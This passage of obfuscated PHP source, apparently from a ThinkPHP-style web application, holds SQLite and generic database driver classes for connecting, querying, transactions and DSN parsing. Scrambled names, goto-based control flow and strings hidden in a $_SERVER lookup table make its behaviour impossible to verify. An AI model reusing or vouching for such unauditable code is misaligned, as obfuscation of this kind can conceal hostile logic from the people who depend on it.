$this->config[$C¦Ÿ©ñ—šˆ[13]] = array(); } } } public function connect($fëå†ĞœÉ° = '', $E±ÃŸÜî·… = 0) { $EÏÎ‹˜ÔÙ =& $_SERVER[¢ÌÛ]; if (!isset($this->linkID[$E±ÃŸÜî·…])) { goto bª İÙ§; fñÓÌÁ†êœ: @sqlite_busy_timeout($this->linkID[$E±ÃŸÜî·…], 30000); if (1 != think_config($EÏÎ‹˜ÔÙ[18])) { unset($this->config); } goto Dµ´ÈÚ°µ‹; Bğ¯Ÿã–Ä: $this->linkID[$E±ÃŸÜî·…] = $eÅÄâŒ›Õ¸($fëå†ĞœÉ°[$EÏÎ‹˜ÔÙ[17]], $fëå†ĞœÉ°[$EÏÎ‹˜ÔÙ[12]]); if (!$this->linkID[$E±ÃŸÜî·…]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto fñÓÌÁ†êœ; bª İÙ§: if (empty($fëå†ĞœÉ°)) { $fëå†ĞœÉ° = $this->config; } $A“ÛŞí”«ù = !empty($fëå†ĞœÉ°[$EÏÎ‹˜ÔÙ[13]][$EÏÎ‹˜ÔÙ[14]]) ? $fëå†ĞœÉ°[$EÏÎ‹˜ÔÙ[13]][$EÏÎ‹˜ÔÙ[14]] : $this->pconnect; $eÅÄâŒ›Õ¸ = $A“ÛŞí”«ù ? $EÏÎ‹˜ÔÙ[15] : $EÏÎ‹˜ÔÙ[16]; goto Bğ¯Ÿã–Ä; Dµ´ÈÚ°µ‹: } return $this->linkID[$E±ÃŸÜî·…]; } public function free() { $this->queryID = null; } public function query($DÙåš¹Öì) { goto Aï¯²‰º‘; Aï¯²‰º‘: $Bë´Şò­íÍ =& $_SERVER[¢ÌÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÃßÁƒåõ; FÃßÁƒåõ: $this->queryStr = $DÙåš¹Öì; if ($this->queryID) { $this->free(); } think_action_status($Bë´Şò­íÍ[19], 1); goto Bµö»Õñ‹; Bµö»Õñ‹: think_status($Bë´Şò­íÍ[20]); $this->queryID = sqlite_query($this->_linkID, $DÙåš¹Öì); $this->debug(); goto Cåµèà¨°; Cåµèà¨°: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $d«èŞ ¨ˆ‰ = $this->getAll(); return $d«èŞ ¨ˆ‰; } goto CâïŸîÓĞŠ; CâïŸîÓĞŠ: } public function execute($dÈ£–‰Ÿ·ø) { goto b¢Ç Ù†; b¢Ç Ù†: $f°µ²ˆáÛ® =& $_SERVER[¢ÌÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aØ¥Üšª–×; aØ¥Üšª–×: $this->queryStr = $dÈ£–‰Ÿ·ø; if ($this->queryID) { $this->free(); } think_action_status($f°µ²ˆáÛ®[21], 1); goto e‰˜Õ„ìÔÅ; fœ¹ƒäÒÉã: if (!1 === $bïµò–à§) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto féß›™òøë; e‰˜Õ„ìÔÅ: think_status($f°µ²ˆáÛ®[20]); $bïµò–à§ = sqlite_exec($this->_linkID, $dÈ£–‰Ÿ·ø); $this->debug(); goto fœ¹ƒäÒÉã; féß›™òøë: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¢ÌÛ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¶õ¦©£® = sqlite_query($this->_linkID, $_SERVER[¢ÌÛ][23]); if (!$C¶õ¦©£®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÉÑÄå…Û¨ = sqlite_query($this->_linkID, $_SERVER[¢ÌÛ][24]); if (!$aÉÑÄå…Û¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f¯¨êÈ³•Ã = array(); if ($this->numRows > 0) { for ($bÊ ‡äŞˆƒ = 0; $bÊ ‡äŞˆƒ < $this->numRows; $bÊ ‡äŞˆƒ++) { $f¯¨êÈ³•Ã[$bÊ ‡äŞˆƒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $f¯¨êÈ³•Ã; } public function getFields($f¿–¨æõµÑ) { $Cë ã‘ã­ì =& $_SERVER[¢ÌÛ]; $A™‚¶Ş¶¦« = $this->query($Cë ã‘ã­ì[25] . $f¿–¨æõµÑ . $Cë ã‘ã­ì[26]); $e›™ää—¸° = array(); if ($A™‚¶Ş¶¦«) { foreach ($A™‚¶Ş¶¦« as $c·òëùç‚ã => $F„¼ÓÅ²”ô) { $e›™ää—¸°[$F„¼ÓÅ²”ô[$Cë ã‘ã­ì[27]]] = array($Cë ã‘ã­ì[28] => $F„¼ÓÅ²”ô[$Cë ã‘ã­ì[27]], $Cë ã‘ã­ì[29] => $F„¼ÓÅ²”ô[$Cë ã‘ã­ì[30]], $Cë ã‘ã­ì[31] => (bool) ($F„¼ÓÅ²”ô[$Cë ã‘ã­ì[32]] === $Cë ã‘ã­ì[33]), $Cë ã‘ã­ì[34] => $F„¼ÓÅ²”ô[$Cë ã‘ã­ì[35]], $Cë ã‘ã­ì[36] => strtolower($F„¼ÓÅ²”ô[$Cë ã‘ã­ì[37]]) == $Cë ã‘ã­ì[38], $Cë ã‘ã­ì[39] => strtolower($F„¼ÓÅ²”ô[$Cë ã‘ã­ì[40]]) == $Cë ã‘ã­ì[41]); } } return $e›™ää—¸°; } public function getTables($e”…à…÷¸ù = '') { $DÖ´ó–£Â‘ =& $_SERVER[¢ÌÛ]; $b»Û·–™’¶ = $this->query($DÖ´ó–£Â‘[42] . $DÖ´ó–£Â‘[43] . $DÖ´ó–£Â‘[44]); $AêäõÌòÀ® = array(); foreach ($b»Û·–™’¶ as $DÈÈ…ëÚ… => $FÜ›ğ®åê) { $AêäõÌòÀ®[$DÈÈ…ëÚ…] = current($FÜ›ğ®åê); } return $AêäõÌòÀ®; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $B¼Öµ°³øó =& $_SERVER[¢ÌÛ]; $aÈŸšæãÈ° = sqlite_last_error($this->_linkID); $this->error = $aÈŸšæãÈ° . $B¼Öµ°³øó[4] . sqlite_error_string($aÈŸšæãÈ°); if ($B¼Öµ°³øó[33] != $this->queryStr) { $this->error .= LNG($B¼Öµ°³øó[45]) . $this->queryStr; } think_trace($this->error, $B¼Öµ°³øó[33], $B¼Öµ°³øó[46]); return $this->error; } public function escapeString($B·ˆ„¸Ö) { return sqlite_escape_string($B·ˆ„¸Ö); } public function parseLimit($BÁØÈ‘Òˆ) { $c¾¤Õà‚Ç =& $_SERVER[¢ÌÛ]; $Eë²·ø£ä = $c¾¤Õà‚Ç[33]; if (!empty($BÁØÈ‘Òˆ)) { $BÁØÈ‘Òˆ = explode($c¾¤Õà‚Ç[47], $BÁØÈ‘Òˆ); if (count($BÁØÈ‘Òˆ) > 1) { $Eë²·ø£ä .= $c¾¤Õà‚Ç[48] . $BÁØÈ‘Òˆ[1] . $c¾¤Õà‚Ç[49] . $BÁØÈ‘Òˆ[0] . $c¾¤Õà‚Ç[50]; } else { $Eë²·ø£ä .= $c¾¤Õà‚Ç[48] . $BÁØÈ‘Òˆ[0] . $c¾¤Õà‚Ç[50]; } } return $Eë²·ø£ä; } } class DbSqlite3Base extends Db { public function __construct($D¬´İ¸ï÷ = '') { $bÅâµ‡¦ø‹ =& $_SERVER[¢ÌÛ]; if (!class_exists($bÅâµ‡¦ø‹[51])) { think_exception(think_lang($bÅâµ‡¦ø‹[10]) . $bÅâµ‡¦ø‹[52]); } if (!empty($D¬´İ¸ï÷)) { if (!isset($D¬´İ¸ï÷[$bÅâµ‡¦ø‹[12]])) { $D¬´İ¸ï÷[$bÅâµ‡¦ø‹[12]] = 438; } $this->config = $D¬´İ¸ï÷; if (empty($this->config[$bÅâµ‡¦ø‹[13]])) { $this->config[$bÅâµ‡¦ø‹[13]] = array(); } } } public function connect($B«Ùéíìº = '', $a†çñïŠáµ = 0) { $FÒÍ‘»Å =& $_SERVER[¢ÌÛ]; if (!isset($this->linkID[$a†çñïŠáµ])) { if (empty($B«Ùéíìº)) { $B«Ùéíìº = $this->config; } $this->linkID[$a†çñïŠáµ] = new SQLite3($B«Ùéíìº[$FÒÍ‘»Å[17]]); if (!$this->linkID[$a†çñïŠáµ]) { think_exception($this->linkID[$a†çñïŠáµ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$a†çñïŠáµ]->busyTimeout(30000); if (1 != think_config($FÒÍ‘»Å[18])) { unset($this->config); } } return $this->linkID[$a†çñïŠáµ]; } public function free() { $this->queryID = null; } public function query($A³î“ÌõÌ) { goto F˜ÌÇ¯´°“; F˜ÌÇ¯´°“: $dÍÚĞõ»¸  =& $_SERVER[¢ÌÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B÷”µ¤àäó; CŒ¹ »ë†­: if (!1 === $this->queryID) { $this->error(); return !1; } else { $f³ËÛ—Õ = $this->getAll(); $this->numRows = count($f³ËÛ—Õ); return $f³ËÛ—Õ; } goto Cù¢’¸ä; B÷”µ¤àäó: $this->queryStr = $A³î“ÌõÌ; if ($this->queryID) { $this->free(); } think_action_status($dÍÚĞõ»¸ [19], 1); goto b¹“Ê®˜«¶; b¹“Ê®˜«¶: think_status($dÍÚĞõ»¸ [20]); $this->queryID = $this->_linkID->query($A³î“ÌõÌ); $this->debug(); goto CŒ¹ »ë†­; Cù¢’¸ä: } public function execute($Aß©ò±ù) { goto d”í³„ò¢Ç; A°²‡ô¢¤: $this->queryStr = $Aß©ò±ù; if ($this->queryID) { $this->free(); } think_action_status($A­”‰®Ã¬·[21], 1); goto FÃÇÆ‘ä’; D®øˆ‹Ïæ»: if (!1 === $cÅÕ¢‡éõÅ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto fº’äŠ£Ì; FÃÇÆ‘ä’: think_status($A­”‰®Ã¬·[20]); $cÅÕ¢‡éõÅ = $this->_linkID->exec($Aß©ò±ù); $this->debug(); goto D®øˆ‹Ïæ»; d”í³„ò¢Ç: $A­”‰®Ã¬· =& $_SERVER[¢ÌÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A°²‡ô¢¤; fº’äŠ£Ì: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¢ÌÛ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d‡’ÈÄ¡Í§ = $this->_linkID->query($_SERVER[¢ÌÛ][23]); if (!$d‡’ÈÄ¡Í§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cãŸçŸä÷” = $this->_linkID->query($_SERVER[¢ÌÛ][24]); if (!$cãŸçŸä÷”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fÑêåÊ ã = array(); while ($B³õİáÔÃº = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fÑêåÊ ã[] = $B³õİáÔÃº; } $this->queryID->reset(); return $fÑêåÊ ã; } public function getFields($FÌËÁÎ«õù) { $EÇ£×Ïõ›÷ =& $_SERVER[¢ÌÛ]; $C²ë™ïãÍÏ = $this->query($EÇ£×Ïõ›÷[25] . $FÌËÁÎ«õù . $EÇ£×Ïõ›÷[26]); $DçšÌğ¼…­ = array(); if ($C²ë™ïãÍÏ) { foreach ($C²ë™ïãÍÏ as $cÏ¨îÚÚ•’ => $aÖ‘œŸ‡Ç) { $DçšÌğ¼…­[$aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[28]]] = array($EÇ£×Ïõ›÷[28] => $aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[28]], $EÇ£×Ïõ›÷[29] => $aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[29]], $EÇ£×Ïõ›÷[31] => (bool) ($aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[31]] === $EÇ£×Ïõ›÷[33]), $EÇ£×Ïõ›÷[34] => $aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[53]], $EÇ£×Ïõ›÷[36] => (bool) $aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[54]], $EÇ£×Ïõ›÷[39] => (bool) $aÖ‘œŸ‡Ç[$EÇ£×Ïõ›÷[54]]); } } return $DçšÌğ¼…­; } public function getTables($D„…‘å¼â¡ = '') { $a¿Ïã–‘ŞŒ =& $_SERVER[¢ÌÛ]; $EÀÚ†ÅĞ« = $this->query($a¿Ïã–‘ŞŒ[42] . $a¿Ïã–‘ŞŒ[43] . $a¿Ïã–‘ŞŒ[44]); $EŞ…Ó¦Å = array(); foreach ($EÀÚ†ÅĞ« as $bÅ±Œ®åÍï => $a“Ú„Ú­İË) { $EŞ…Ó¦Å[$bÅ±Œ®åÍï] = current($a“Ú„Ú­İË); } return $EŞ…Ó¦Å; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E÷ù™æ¯«ç =& $_SERVER[¢ÌÛ]; $this->error = $this->_linkID->lastErrorMsg(); if ($E÷ù™æ¯«ç[33] != $this->queryStr) { $this->error .= LNG($E÷ù™æ¯«ç[45]) . $this->queryStr; } think_trace($this->error, $E÷ù™æ¯«ç[33], $E÷ù™æ¯«ç[46]); return $this->error; } public function escapeString($a÷ŠÀëÈ) { $D†Ö›â–õ =& $_SERVER[¢ÌÛ]; if ($this->_linkID) { return $this->_linkID->escapeString($a÷ŠÀëÈ); } return str_ireplace($D†Ö›â–õ[55], $D†Ö›â–õ[56], $a÷ŠÀëÈ); } public function parseLimit($c×´ÃÄ’¹ï) { $EĞĞÙ™ÇŞ =& $_SERVER[¢ÌÛ]; $BÔŒ´ØÔ­ = $EĞĞÙ™ÇŞ[33]; if (!empty($c×´ÃÄ’¹ï)) { $c×´ÃÄ’¹ï = explode($EĞĞÙ™ÇŞ[47], $c×´ÃÄ’¹ï); if (count($c×´ÃÄ’¹ï) > 1) { $BÔŒ´ØÔ­ .= $EĞĞÙ™ÇŞ[48] . $c×´ÃÄ’¹ï[1] . $EĞĞÙ™ÇŞ[49] . $c×´ÃÄ’¹ï[0] . $EĞĞÙ™ÇŞ[50]; } else { $BÔŒ´ØÔ­ .= $EĞĞÙ™ÇŞ[48] . $c×´ÃÄ’¹ï[0] . $EĞĞÙ™ÇŞ[50]; } } return $BÔŒ´ØÔ­; } } goto F‡å‡‡ñ«Ú; d’¦Û„´œ: class DbSqlite3 extends DbSqlite3Base { public function query($f¬ÜñˆĞ·‚) { $DĞÉà¢ç®Ò =& $_SERVER[¢ÌÛ]; if (!CacheLock::fileLock($DĞÉà¢ç®Ò[9])) { return !1; } $B‰íÒè´†æ = parent::query($f¬ÜñˆĞ·‚); CacheLock::fileUnLock($DĞÉà¢ç®Ò[9]); return $B‰íÒè´†æ; } public function execute($f›å¬íÊÎ) { $eù®Î„›ô =& $_SERVER[¢ÌÛ]; if (!CacheLock::fileLock($eù®Î„›ô[9])) { return !1; } $fÚÈ¡œ›à = parent::execute($f›å¬íÊÎ); CacheLock::fileUnLock($eù®Î„›ô[9]); return $fÚÈ¡œ›à; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\x65\161" => "\x3c\76", "\x67\164" => "\x3e", "\x65\147\164" => "\x3e\x3d", "\x6c\164" => "\74", "\145\x6c\x74" => "\x3c\75", "\x6e\x6f\x74\154\x69\x6b\x65" => "\x4e\117\124\x20\x4c\111\x4b\x45", "\x6c\151\153\145" => "\x4c\x49\113\105", "\151\x6e" => "\x49\x4e", "\x6e\157\164\x69\156" => "\116\x4f\x54\x20\111\116", "\156\x6f\164\40\x69\156" => "\116\117\x54\x20\111\116", "\x62\x65\x74\167\x65\145\156" => "\102\105\124\x57\105\x45\x4e", "\x6e\157\164\x62\145\164\167\x65\145\156" => "\116\117\x54\40\102\x45\124\x57\x45\x45\x4e", "\156\157\x74\40\142\x65\x74\167\145\145\156" => "\116\117\124\40\x42\105\124\x57\x45\x45\116"); protected $selectSql = "\123\105\114\x45\103\x54\x25\104\111\123\124\111\116\x43\124\x25\x20\45\106\x49\105\114\104\45\40\x46\122\x4f\115\x20\45\x54\x41\102\114\x45\x25\x25\x4a\x4f\x49\x4e\x25\x25\127\110\x45\122\105\x25\45\107\122\x4f\x55\120\45\x25\110\101\126\111\x4e\107\45\45\x4f\x52\104\x45\x52\45\45\x4c\x49\115\x49\124\x25\40\x25\125\116\x49\117\x4e\x25\45\103\117\115\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $AÛ«‹àĞß· = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¢ÌÛ][896], $AÛ«‹àĞß·); } public function factory($Dèò…¶„òÄ = '') { goto aØŸ–ˆÛò; aØŸ–ˆÛò: $E«°áœ¾Û£ =& $_SERVER[¢ÌÛ]; $Dèò…¶„òÄ = $this->parseConfig($Dèò…¶„òÄ); if (empty($Dèò…¶„òÄ[$E«°áœ¾Û£[897]])) { think_exception(think_lang($E«°áœ¾Û£[898])); } goto Cì¿›…îÇ…; Cì¿›…îÇ…: $this->dbType = ucwords(strtolower($Dèò…¶„òÄ[$E«°áœ¾Û£[897]])); $A®’Àá²« = $E«°áœ¾Û£[899] . $this->dbType; if (class_exists($A®’Àá²«)) { $F˜®ëñÂ—µ = new $A®’Àá²«($Dèò…¶„òÄ); if ($E«°áœ¾Û£[746] != strtolower($Dèò…¶„òÄ[$E«°áœ¾Û£[897]])) { $F˜®ëñÂ—µ->dbType = strtoupper($this->dbType); } else { $F˜®ëñÂ—µ->dbType = $this->_getDsnType($Dèò…¶„òÄ[$E«°áœ¾Û£[852]]); } } else { think_exception(think_lang($E«°áœ¾Û£[900]) . $E«°áœ¾Û£[901] . $A®’Àá²«); } goto cµÓÒË©ĞÌ; cµÓÒË©ĞÌ: return $F˜®ëñÂ—µ; goto dàïö„¿Ø®; dàïö„¿Ø®: } public function __call($Dƒ‰ÆÀñ‘Ê, $eØÇ¤—½Ê) { if (method_exists($this, $Dƒ‰ÆÀñ‘Ê)) { return call_user_func_array(array($this, $Dƒ‰ÆÀñ‘Ê), $eØÇ¤—½Ê); } } protected function _getDsnType($fÖ¼êõÀÒß) { $c®ïÑÔ £Ì = explode($_SERVER[¢ÌÛ][4], $fÖ¼êõÀÒß); $Aòï’“ÑÖ­ = strtoupper(trim($c®ïÑÔ £Ì[0])); return $Aòï’“ÑÖ­; } private function parseConfig($a†÷›Ï—å = '') { $CÊ‹·ÏÆß× =& $_SERVER[¢ÌÛ]; if (!empty($a†÷›Ï—å) && is_string($a†÷›Ï—å)) { $a†÷›Ï—å = $this->parseDSN($a†÷›Ï—å); } elseif (is_array($a†÷›Ï—å)) { $a†÷›Ï—å = array_change_key_case($a†÷›Ï—å); $a†÷›Ï—å = array($CÊ‹·ÏÆß×[897] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[745]], $CÊ‹·ÏÆß×[825] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[902]], $CÊ‹·ÏÆß×[826] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[903]], $CÊ‹·ÏÆß×[823] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[904]], $CÊ‹·ÏÆß×[824] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[905]], $CÊ‹·ÏÆß×[17] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[906]], $CÊ‹·ÏÆß×[852] => $a†÷›Ï—å[$CÊ‹·ÏÆß×[747]], $CÊ‹·ÏÆß×[13] => isset($a†÷›Ï—å[$CÊ‹·ÏÆß×[907]]) ? $a†÷›Ï—å[$CÊ‹·ÏÆß×[907]] : array()); } elseif (empty($a†÷›Ï—å)) { if (think_config($CÊ‹·ÏÆß×[908]) && $CÊ‹·ÏÆß×[746] != strtolower(think_config($CÊ‹·ÏÆß×[909]))) { $a†÷›Ï—å = $this->parseDSN(think_config($CÊ‹·ÏÆß×[908])); } else { $a†÷›Ï—å = array($CÊ‹·ÏÆß×[897] => think_config($CÊ‹·ÏÆß×[909]), $CÊ‹·ÏÆß×[825] => think_config($CÊ‹·ÏÆß×[910]), $CÊ‹·ÏÆß×[826] => think_config($CÊ‹·ÏÆß×[911]), $CÊ‹·ÏÆß×[823] => think_config($CÊ‹·ÏÆß×[912]), $CÊ‹·ÏÆß×[824] => think_config($CÊ‹·ÏÆß×[913]), $CÊ‹·ÏÆß×[17] => think_config($CÊ‹·ÏÆß×[242]), $CÊ‹·ÏÆß×[852] => think_config($CÊ‹·ÏÆß×[908]), $CÊ‹·ÏÆß×[13] => think_config($CÊ‹·ÏÆß×[914])); } } return $a†÷›Ï—å; } protected function initConnect($Eß•ÙóÊõ = true) { if (1 == think_config($_SERVER[¢ÌÛ][18])) { $this->_linkID = $this->multiConnect($Eß•ÙóÊõ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $A•˜…†ÉªØ => $AğóÂ´¾) { $this->_linkID = $AğóÂ´¾; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($BæâÕ¹ËŠ = false) { $dïŒæ‘®Ú× =& $_SERVER[¢ÌÛ]; static $A«İ›öëğ = array(); if (empty($A«İ›öëğ)) { foreach ($this->config as $AŒÊÑ‡¥Î => $Føõ±ŠÁ¬¦) { $A«İ›öëğ[$AŒÊÑ‡¥Î] = explode($dïŒæ‘®Ú×[47], $Føõ±ŠÁ¬¦); } } if (think_config($dïŒæ‘®Ú×[915])) { if ($BæâÕ¹ËŠ) { $EÉÂµ«©ö  = floor(mt_rand(0, think_config($dïŒæ‘®Ú×[916]) - 1)); } else { if (is_numeric(think_config($dïŒæ‘®Ú×[917]))) { $EÉÂµ«©ö  = think_config($dïŒæ‘®Ú×[917]); } else { $EÉÂµ«©ö  = floor(mt_rand(think_config($dïŒæ‘®Ú×[916]), count($A«İ›öëğ[$dïŒæ‘®Ú×[823]]) - 1)); } } } else { $EÉÂµ«©ö  = floor(mt_rand(0, count($A«İ›öëğ[$dïŒæ‘®Ú×[823]]) - 1)); } $e¡ÄÉ±™‰Û = array($dïŒæ‘®Ú×[825] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[825]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[825]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[825]][0], $dïŒæ‘®Ú×[826] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[826]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[826]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[826]][0], $dïŒæ‘®Ú×[823] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[823]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[823]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[823]][0], $dïŒæ‘®Ú×[824] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[824]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[824]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[824]][0], $dïŒæ‘®Ú×[17] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[17]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[17]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[17]][0], $dïŒæ‘®Ú×[852] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[852]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[852]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[852]][0], $dïŒæ‘®Ú×[13] => isset($A«İ›öëğ[$dïŒæ‘®Ú×[13]][$EÉÂµ«©ö ]) ? $A«İ›öëğ[$dïŒæ‘®Ú×[13]][$EÉÂµ«©ö ] : $A«İ›öëğ[$dïŒæ‘®Ú×[13]][0]); return $this->connect($e¡ÄÉ±™‰Û, $EÉÂµ«©ö ); } public function parseDSN($BËŸ‹¼Üº) { $b†×œ÷ŠÙŠ =& $_SERVER[¢ÌÛ]; if (empty($BËŸ‹¼Üº)) { return !1; } $FæÖçÈ·¾œ = parse_url($BËŸ‹¼Üº); if ($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[174]]) { $b÷Âì—Ìª¾ = array($b†×œ÷ŠÙŠ[897] => $FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[174]], $b†×œ÷ŠÙŠ[825] => isset($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[560]]) ? $FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[560]] : $b†×œ÷ŠÙŠ[33], $b†×œ÷ŠÙŠ[826] => isset($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[918]]) ? $FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[918]] : $b†×œ÷ŠÙŠ[33], $b†×œ÷ŠÙŠ[823] => isset($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[175]]) ? $FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[175]] : $b†×œ÷ŠÙŠ[33], $b†×œ÷ŠÙŠ[824] => isset($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[176]]) ? $FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[176]] : $b†×œ÷ŠÙŠ[33], $b†×œ÷ŠÙŠ[17] => isset($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[75]]) ? substr($FæÖçÈ·¾œ[$b†×œ÷ŠÙŠ[75]], 1) : $b†×œ÷ŠÙŠ[33]); } else { preg_match($b†×œ÷ŠÙŠ[919], trim($BËŸ‹¼Üº), $e¼Ùí‚ÊÕ); $b÷Âì—Ìª¾ = array($b†×œ÷ŠÙŠ[897] => $e¼Ùí‚ÊÕ[1], $b†×œ÷ŠÙŠ[825] => $e¼Ùí‚ÊÕ[2], $b†×œ÷ŠÙŠ[826] => $e¼Ùí‚ÊÕ[3], $b†×œ÷ŠÙŠ[823] => $e¼Ùí‚ÊÕ[4], $b†×œ÷ŠÙŠ[824] => $e¼Ùí‚ÊÕ[5], $b†×œ÷ŠÙŠ[17] => $e¼Ùí‚ÊÕ[6]); } $b÷Âì—Ìª¾[$b†×œ÷ŠÙŠ[852]] = $b†×œ÷ŠÙŠ[33]; return $b÷Âì—Ìª¾; } protected function debug() { $aï–Â·¤¦ =& $_SERVER[¢ÌÛ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $aï–Â·¤¦[920]; if (think_config($aï–Â·¤¦[921])) { think_status($aï–Â·¤¦[922]); think_trace($this->queryStr . $aï–Â·¤¦[923] . think_status($aï–Â·¤¦[20], $aï–Â·¤¦[922], 6) . $aï–Â·¤¦[924], $aï–Â·¤¦[33], $aï–Â·¤¦[925]); } } protected function parseLock($EØË¶Åçôç = false) { $dºµÀÒİ¼² =& $_SERVER[¢ÌÛ]; if (!$EØË¶Åçôç) { return $dºµÀÒİ¼²[33]; } if ($dºµÀÒİ¼²[854] == $this->dbType) { return $dºµÀÒİ¼²[926]; } return $dºµÀÒİ¼²[927]; } protected function parseSet($A¦©ƒĞ•²à) { $f‚Ü‘Ë¿ŠÓ =& $_SERVER[¢ÌÛ]; foreach ($A¦©ƒĞ•²à as $E¤ƒˆåÙëÄ => $fäšÆÈõƒ™) { if (is_array($fäšÆÈõƒ™) && $f‚Ü‘Ë¿ŠÓ[293] == $fäšÆÈõƒ™[0]) { $B µê…›Õ[] = $this->parseKey($E¤ƒˆåÙëÄ) . $f‚Ü‘Ë¿ŠÓ[928] . $fäšÆÈõƒ™[1]; } elseif (is_scalar($fäšÆÈõƒ™) || is_null($fäšÆÈõƒ™)) { $B µê…›Õ[] = $this->parseKey($E¤ƒˆåÙëÄ) . $f‚Ü‘Ë¿ŠÓ[928] . $this->parseValue($fäšÆÈõƒ™); } } return $f‚Ü‘Ë¿ŠÓ[929] . implode($f‚Ü‘Ë¿ŠÓ[47], $B µê…›Õ); } protected function bindParam($dÂˆÊŒí„‘, $Eˆ¢…Æ˜ğË) { $this->bind[$_SERVER[¢ÌÛ][4] . $dÂˆÊŒí„‘] = $Eˆ¢…Æ˜ğË; } protected function parseBind($fƒÂï”Æê) { $fƒÂï”Æê = array_merge($this->bind, $fƒÂï”Æê); $this->bind = array(); return $fƒÂï”Æê; } function parseKey(&$fÜôå°ÑÂ¶, $eøˆ‡Õ‡†® = true) { if ($eøˆ‡Õ‡†®) { $fÜôå°ÑÂ¶ = $this->parseKeyCheck($fÜôå°ÑÂ¶); } return $fÜôå°ÑÂ¶; } function parseKeyCheck($eŞ™¸¹‹) { $C‡™£Ñ¢¦Ô =& $_SERVER[¢ÌÛ]; $eŞ™¸¹‹ = trim($eŞ™¸¹‹); if 